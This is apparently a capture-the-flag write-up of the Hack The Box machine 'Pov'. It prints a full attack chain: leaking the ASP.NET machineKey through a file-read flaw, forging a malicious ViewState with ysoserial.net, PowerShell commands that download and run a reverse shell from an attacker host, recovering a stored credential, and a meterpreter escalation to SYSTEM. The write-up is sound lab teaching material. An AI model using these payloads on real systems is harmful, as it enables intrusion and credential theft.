---
title:  "HTB Pov Writeup"
date:   2024-06-08 00:30:00 
categories: HTB Machine
tags:  SeDebugPrivilege viewstate deserialization subdomain_bruteforcing
---

![Pov](/assets/img/Pov/GEs6A8bXgAAyzYJ.png)

## Introduction 

I found this a very interesting machine and learned a lot about some subjects I didn't know much about before. Exploiting viewstates was very interesting and opened my eyes to some new vulnerabilities. The way to system was pretty straight forward and a very common attack path abusing the SeDebugPrivilege 

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A  -p-  -o nmap  10.129.228.67
```
**Nmap**
```
# Nmap 7.94 scan initiated Mon Jan 29 15:44:11 2024 as: nmap -sS -A -p- -o nmap 10.129.228.67
Nmap scan report for 10.129.228.67
Host is up (0.026s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: pov.htb
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   30.58 ms 10.10.14.1
2   26.85 ms 10.129.228.67

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 29 15:47:08 2024 -- 1 IP address (1 host up) scanned in 177.54 seconds
```

When reviewing the Nmap output we can see that there is only one port open, being the HTTP port 80. So we go check out webpage. When browsing to the webpage it was just a static webpage. This makes me believe there is either a directory hidden or a subdomain.

![Main page](/assets/img/Pov/Pov_01.png)


So to check for subdomains i used the wfuzz tool in combination with a subdomain list from seclists. Also i used the **--hl 233** parameter to filter out every response with that length. I did this because when running the tool first i noticed that all false responses would return a status code 200 with a length of 233. Now we can see that the subdomain dev is also being used.

```bash
wfuzz -c -f sub-fighter -Z -w /home/kali/share/Share/Tools/general/SecLists/Discovery/DNS/subdomains-top1million-5000.txt   -u http://pov.htb -H "Host: FUZZ.pov.htb" --hl 233
```
![Dev found ](/assets/img/Pov/Pov_02.png)

### dev.pov.htb

So when checking out this webpage we could see that this was a portfolio site  of the web developer. This page was mostly static except one function where we could download the CV.

![Dev page](/assets/img/Pov/Pov_03.png)

When pressing the download CV button the browser would send the following request, we can see that the last paramter specifies which file to grab

```
POST /portfolio/default.aspx HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 359
Origin: http://dev.pov.htb
Connection: close
Referer: http://dev.pov.htb/portfolio/default.aspx
Upgrade-Insecure-Requests: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=ZLc5Fw60f897yl4jcu%2FfMRSgo8r1E5baUPMlOaTK5yE0PMTxegaY%2FvQvR4eBDtw0bLEvA6eYTlB%2B%2B4WUEbSL6bsKPp8%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=SBEeFac5IcHePiwsYIvVtsW%2B4ZV8njEbsCtSHbbm8WzFUQOTEXcpv10lpFUjoHRmu1r4fY3km9X2wZLb9nwWaQryF4fEGlvStQI3CMhHaBRvF8D41j4sLQhn%2BOfBgv5Lsff0Og%3D%3D&file=cv.pdf
```
This would then return the following pdf file.

![PDF file ](/assets/img/Pov/Pov_04.png)

The file parameter was suspicious to me so i then tried to obtain another file present on the application. my first guess was trying to get the **default.aspx** page because we know it exists in the portfolio directory.

```
POST /portfolio/default.aspx HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 365
Origin: http://dev.pov.htb
Connection: close
Referer: http://dev.pov.htb/portfolio/default.aspx
Upgrade-Insecure-Requests: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=ZLc5Fw60f897yl4jcu%2FfMRSgo8r1E5baUPMlOaTK5yE0PMTxegaY%2FvQvR4eBDtw0bLEvA6eYTlB%2B%2B4WUEbSL6bsKPp8%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=SBEeFac5IcHePiwsYIvVtsW%2B4ZV8njEbsCtSHbbm8WzFUQOTEXcpv10lpFUjoHRmu1r4fY3km9X2wZLb9nwWaQryF4fEGlvStQI3CMhHaBRvF8D41j4sLQhn%2BOfBgv5Lsff0Og%3D%3D&file=default.aspx
```
The server would then return the following valid response with the source code of this file. This was a clear sign that this paramter could be used to obtain other files present on the webserver.

```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/octet-stream
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=default.aspx
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Tue, 30 Jan 2024 18:11:00 GMT
Connection: close
Content-Length: 20948

<%@ Page Language="C#" AutoEventWireup="true" CodeFile="index.aspx.cs" Inherits="index"%>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Start your development with Steller landing page.">
    <meta name="author" content="Devcrud">
    <title>dev.pov.htb</title>
    <!-- font icons -->
    <link rel="stylesheet" href="assets/vendors/themify-icons/css/themify-icons.css">
```

So knowing we can grab files from this webserver which aren't normally accessible I started to enumerate any potential files i could get. After some enumration i stumbled upon the **web.config** file in the webroot. Send the following request to get this file.

```
POST /portfolio/default.aspx HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 374
Origin: http://dev.pov.htb
Connection: close
Referer: http://dev.pov.htb/portfolio/default.aspx
Upgrade-Insecure-Requests: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=RwR5fIivifEUxvefHxd595myz7BBHTvc9TmczFPNlrR7zQp3qPhZAlIvoz35h%2BoPCXt%2F82xCh3FvzytdD8PxHT%2BErAc%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=%2BDoocaK9Xwt%2BtwMAtx6renUwuz%2BoWdwy%2BiWR3QoTriN%2FU9FiveLT%2BcRSYqIaynLSNzk36Ajyr1WyypiQUZ%2Bhv5zxhaEI4fqEzpu2nYe6wdrneG%2B735TTEqdXGKb3afydAyQSzg%3D%3D&file=/web.config
```

The server would then return the web.config file.

```
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

### Exploiting viewstate

ViewState is the method that the ASP.NET framework uses by default to preserve page and control values between web pages. When the HTML for the page is rendered, the current state of the page and values that need to be retained during postback are serialized into base64-encoded strings and output in the ViewState hidden field or fields. 

Now with what we found in the in the web.config we should be able to exploit the viewstates. The webconfig included all details needed namely:

- decryption="AES"
- decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"
- validation="SHA1"
- validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"

Using these parameters its possible to create a new malicious viewstate using [ysoserial.net](https://github.com/pwntester/ysoserial.net). The command would look like the following to make it send a simple web request to our machine

```powershell
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/contact.aspx"  -c "curl 10.10.14.101/test"
```
This would create the following viewstate.

![Viewstate web request](/assets/img/Pov/Pov_05.png)

```
TRvC4LdMVipwH8wRm8Ox6wvTsPsU%2BNLWI25gkEkH7J%2B39TshomH1t52FQjNz3X1HRa25TQb9FEVxZ%2Fgy8z%2FKn9U%2B3PEuLtqzzKwyK%2BeD8Re6skggzze0p9Znq2kgFMQ6qQAShfXqsI%2FOVg1WAjPGpLp3W1TncgkHqWCc%2BgkFT%2FHU%2BaTyl5thrlzbb7reE8BGZlmfZZ8fcqwFVcPrfZaUPfLKpi8lRXcrejiv9F6jTQBRKkjTnfW2YCSkJ967Px%2Bc6sV%2BO38Y0m%2F4v9R0yXebdXrmchv%2F%2Bh1eZA%2B0vJ6j42gJnGNww38Hm%2BGsQdDud5RQx6wWgGeSS8Ae%2BEk%2BQKMiNe0BJG2Vjl3gcQqr3NT7SBa11spAaOKGzyQO22Pps%2FaRPT6mBQpNeq6vgJtUV3vVveGjEZTZmyt7lpqUzR3QL%2B82pS%2F0PZdFo2aBheZ4FXMemUPWaXC0eT%2F%2B99eyq1OTVY36XvtTvZSEE1vJVlsw3Xql6H4e6GthwcqbhgETQqKekqNtHBsd0VC%2BTz1SqyUf2B2J98GSXc8f8ZhcnbQhBz3fcvOsh3Qjla1QLdaOQiN3OlbS2cfLgdmSfiJ985IH%2FPaPZ%2Fd%2B0DoHXCfSRGRzgsNf9vWmwCU7BkdVUYJjCth1gAH%2BhF%2FWhq5XY5o3Qv4ZmnvGAKQBh8Ds8KdSgflnQKI97k8YcA%2Bzy7PEPVQRYMkWcsMaZLbOjGHP7J3LZ1kXN8ON4chLSsQmQvoB%2FkDXacIisuv69gyX8J1UFTyVnr%2BhtuwRufFBfpOXbe%2FOJdCUgpucFLczbgRyDdVaaObLCig8zCcEQcBnxQRdV2Pp7gkUFq4N399baNKAQzZXa9IvMj3WPnjNI5gbr22g1yGlbAeak5eNrozpXHcfcQg%2BoKKLPPn3GywOiZ%2FRpnFCmp9IkVh8%2Fzvaa7pNW6jXW9c9C4K3hGImULzbOeVG9bbKzBShtanbKIF2Zi%2BDZDx1QgDAiim280bv7f58wrzaQISKDPik8YiBw8X%2BRak3%2Frmodq25yYth8E5tOnMB25OhuWALNWi7y76p%2B817Y92pHfiTq3%2BTlQ7BpsmLeAMvFZWcdQ8yqwwaJUK3NSKlMWkp%2BzfnU0zB8dEpg57L5Llll7NXhIUBZAXEJ5XgpvN9AsWWnTTtPJcMqqHFGycHlO6V48Oc0W3LgTWbUWNUEaAJYxpvFYjGtwRBDHscJSg3gmYJL3zMCMDv1SBi4W6R%2FVLZQdy34Ac%2FG1nCy%2BVL67EHJVFB8GvSMYjyIZsUv0O3T%2Bx%2FiMFqZP0oY3kdPPvxGxrO5Ggxy5eV6bs%3D
```

Before running the command make sure we have webserver running using for example python

```bash
python -m http.server 80
```

When our webserver was running we could send this malicious viewstate with the following request.

```
POST /portfolio/contact.aspx HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1643
Origin: http://dev.pov.htb
Connection: close
Referer: http://dev.pov.htb/portfolio/contact.aspx
Upgrade-Insecure-Requests: 1

__VIEWSTATE=TRvC4LdMVipwH8wRm8Ox6wvTsPsU%2BNLWI25gkEkH7J%2B39TshomH1t52FQjNz3X1HRa25TQb9FEVxZ%2Fgy8z%2FKn9U%2B3PEuLtqzzKwyK%2BeD8Re6skggzze0p9Znq2kgFMQ6qQAShfXqsI%2FOVg1WAjPGpLp3W1TncgkHqWCc%2BgkFT%2FHU%2BaTyl5thrlzbb7reE8BGZlmfZZ8fcqwFVcPrfZaUPfLKpi8lRXcrejiv9F6jTQBRKkjTnfW2YCSkJ967Px%2Bc6sV%2BO38Y0m%2F4v9R0yXebdXrmchv%2F%2Bh1eZA%2B0vJ6j42gJnGNww38Hm%2BGsQdDud5RQx6wWgGeSS8Ae%2BEk%2BQKMiNe0BJG2Vjl3gcQqr3NT7SBa11spAaOKGzyQO22Pps%2FaRPT6mBQpNeq6vgJtUV3vVveGjEZTZmyt7lpqUzR3QL%2B82pS%2F0PZdFo2aBheZ4FXMemUPWaXC0eT%2F%2B99eyq1OTVY36XvtTvZSEE1vJVlsw3Xql6H4e6GthwcqbhgETQqKekqNtHBsd0VC%2BTz1SqyUf2B2J98GSXc8f8ZhcnbQhBz3fcvOsh3Qjla1QLdaOQiN3OlbS2cfLgdmSfiJ985IH%2FPaPZ%2Fd%2B0DoHXCfSRGRzgsNf9vWmwCU7BkdVUYJjCth1gAH%2BhF%2FWhq5XY5o3Qv4ZmnvGAKQBh8Ds8KdSgflnQKI97k8YcA%2Bzy7PEPVQRYMkWcsMaZLbOjGHP7J3LZ1kXN8ON4chLSsQmQvoB%2FkDXacIisuv69gyX8J1UFTyVnr%2BhtuwRufFBfpOXbe%2FOJdCUgpucFLczbgRyDdVaaObLCig8zCcEQcBnxQRdV2Pp7gkUFq4N399baNKAQzZXa9IvMj3WPnjNI5gbr22g1yGlbAeak5eNrozpXHcfcQg%2BoKKLPPn3GywOiZ%2FRpnFCmp9IkVh8%2Fzvaa7pNW6jXW9c9C4K3hGImULzbOeVG9bbKzBShtanbKIF2Zi%2BDZDx1QgDAiim280bv7f58wrzaQISKDPik8YiBw8X%2BRak3%2Frmodq25yYth8E5tOnMB25OhuWALNWi7y76p%2B817Y92pHfiTq3%2BTlQ7BpsmLeAMvFZWcdQ8yqwwaJUK3NSKlMWkp%2BzfnU0zB8dEpg57L5Llll7NXhIUBZAXEJ5XgpvN9AsWWnTTtPJcMqqHFGycHlO6V48Oc0W3LgTWbUWNUEaAJYxpvFYjGtwRBDHscJSg3gmYJL3zMCMDv1SBi4W6R%2FVLZQdy34Ac%2FG1nCy%2BVL67EHJVFB8GvSMYjyIZsUv0O3T%2Bx%2FiMFqZP0oY3kdPPvxGxrO5Ggxy5eV6bs%3D&__VIEWSTATEGENERATOR=37310E71&__EVENTVALIDATION=gbB3R%2BHzbHo0oq7lzLGMWXbsC%2ByQRVlnUdqW6fvswDrRNwhijxbdZKvsIti9RL89IaANlIff4TZcQQrN9JQrSi9f2VXz7xPxExhChaKfkGFF2nJDc1689BrdCTn7nR5dLu7iQQ%3D%3D&message=ttt&submit=Send+Message
```
The server would not respond with a valid response however the command would have executed.

![Viewstate web request](/assets/img/Pov/Pov_06.png)


So now we have proof of code execution but not a reverse shell yet. lets change this. I hosted a copy of  **Invoke-PowerShellTcp.ps1** script of [nishang](https://github.com/samratashok/nishang). This github repo contains multiple powershell scripts including reverse shells and other post exploitation tools. next i would use the following command to execute our reverse shell.

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.101/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.101 -Port 443
```

When filling this command into the ysoserial tool it would look like the following.

```powershell
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/contact.aspx"  -c "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.101/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.101 -Port 443"
```

Then we repeat the same steps as before and send the new viewstate to the browser using the same request (just  replacing the viewstate). A few moments later I'd get a reverse shell as the sfitz user.

![Command execution as Sfitz](/assets/img/Pov/Pov_07.png)

## Lateral movement

When looking through the directories of sfitz i noticed there was a **connection.xml** file present in their documents folder. **C:\Users\sfitz\Documents**. When opening the file we could see that there was a powershell pscredential present 

```
PS C:\Users\sfitz\Documents> cat connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```
Storing credentials like this is not a secure way because these can be retrieved again using just two commands. First we'll use the **import-Clixml** command to import the connection string back into memory as a secure string object. next we can just get the credential with the **$Credential.GetNetworkCredential().password**

```powershell
$Credential = Import-Clixml .\connection.xml
$Credential.GetNetworkCredential().password
```

![Pasword of alaading](/assets/img/Pov/Pov_08.png)

So by doing this we obtained the password of the **alaading** user, it being **f8gQ8fynP44ek1m3**. Now we can use this credential to open a reverse shell. But seeing we can't log in with these directly we'll need to run these using runas, one issue with this is that runas doesn't work unless its a fully interactive shell. The tool [RunasCS](https://github.com/antonioCoco/RunasCs) though can help us with this as it allows us to execute commands without needing to have a interactive shell.

So first of all we need to do is download our RunasCs.exe binary 

```powershell
wget "http://10.10.14.101/RunasCs.exe" -outfile "RunasCs.exe"
```

Next up we can run a command as webservice using the following command, reverse shell we'll re-use the same one we used before but this time with a different port

```powershell
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.101/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.101 -Port 444 "
```

![Shell as alaading](/assets/img/Pov/Pov_09.png)

## Privilege escalation

When checking which privileges the alaading user has I noticed they have the **SeDebugPrivilege** permission. This permission allows a user to debug any program this can be very dangerous because this means the  user can modify process of higher privileges. The easiest way to exploit this is to use the migrate function within metasploits meterpreter shell.

![SeDebugPrivilege](/assets/img/Pov/Pov_10.png)


So first we will generate a new 64 bit meterpreter payload using the following msfvenom command.

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.101 LPORT=4000 -f exe > revshell.exe
```
Next i setup the corresponding  listener
```bash
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_tcp;set LHOST tun0;set LPORT 4000;run;"
```

Now that we have our listener we need to transfer our shell to the machine we can do this using wget and our webserver.

```powershell
wget "http://10.10.14.101/revshell.exe" -outfile "revshell.exe"
```

After running our reverse shell we'd be greeted with our meterpreter shell in our listener. Our next step is to find a process that is owned by a user of a higher privilege as ourselves.

![Meterpreter shell](/assets/img/Pov/Pov_11.png)

Using the PS command we can list all current processes.Now here it doesn't say which processes are owned by other system, However there are some processes which area always started by system. Here i chose to target **winlogon** service with pid **552**

![Running processes](/assets/img/Pov/Pov_12.png)

next up we use the migrate command to migrate our shell into the winlogon process. After the migration has happened we open a shell and can see we are running the shell using system privileges.

![System shell](/assets/img/Pov/Pov_13.png)
